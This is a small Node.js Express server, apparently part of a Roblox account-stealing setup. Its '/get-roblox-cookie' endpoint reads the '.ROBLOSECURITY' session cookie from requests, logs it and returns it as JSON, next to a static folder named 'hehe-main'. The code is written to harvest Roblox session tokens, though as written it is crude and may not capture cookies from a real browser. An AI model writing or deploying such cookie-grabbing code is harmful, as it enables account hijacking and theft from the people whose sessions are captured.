\const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const app = express();
const port = 8081;
const version = 'v24.16.0-1'; // Updated version

// Use cookie-parser middleware
app.use(cookieParser());

// Serve static files from the "Downloads/hehe-main/hehe-main" directory
app.use(express.static(path.join(__dirname, 'Downloads/hehe-main/hehe-main')));

app.get('/get-roblox-cookie', (req, res) => {
    try {
        // Retrieve the .ROBLOSECURITY cookie from the request
        const robloxCookie = req.cookies['.ROBLOSECURITY'];
        if (robloxCookie) {
            console.log('Roblox cookie found:', robloxCookie);
            res.json({ cookie: robloxCookie });
        } else {
            console.log('Roblox cookie not found');
            res.status(404).json({ error: 'Roblox cookie not found' });
        }
    } catch (error) {
        console.error('Error retrieving Roblox cookie:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port} - Version: ${version}`);
});
